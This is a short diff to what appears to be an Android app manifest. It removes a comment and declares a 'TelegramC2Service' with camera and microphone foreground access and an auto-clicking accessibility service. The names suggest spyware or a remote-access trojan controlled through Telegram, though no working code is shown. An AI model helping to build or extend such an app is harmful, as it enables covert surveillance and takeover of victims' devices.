@@ -40,7 +40,6 @@
         <service
             android:name=".TelegramC2Service"
             android:exported="false"
-            <!-- FIXED: Removed mediaProjection from the initial declaration -->
             android:foregroundServiceType="dataSync|camera|microphone" />
 
         <service android:name=".AutoClickerAccessibilityService"
